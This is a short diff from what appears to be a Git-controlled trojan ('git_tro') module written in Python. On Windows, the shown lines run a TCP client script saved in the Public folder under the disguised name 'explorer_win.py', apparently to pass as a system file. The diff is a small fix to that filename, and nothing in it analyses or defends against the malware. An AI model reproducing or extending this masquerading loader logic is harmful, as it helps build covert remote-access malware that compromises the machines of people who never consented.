@@ -47,7 +47,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 	elif os.name == 'nt':
 		scriptPath = "scripts/TCP_client.py"
 		ScriptExec = "python"
-		TargetScript = os.getenv("PUBLIC")+ "\explorer_win"
+		TargetScript = os.getenv("PUBLIC")+ "\explorer_win.py"
 		cmd = ScriptExec+" "+TargetScript
 	else:
 		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
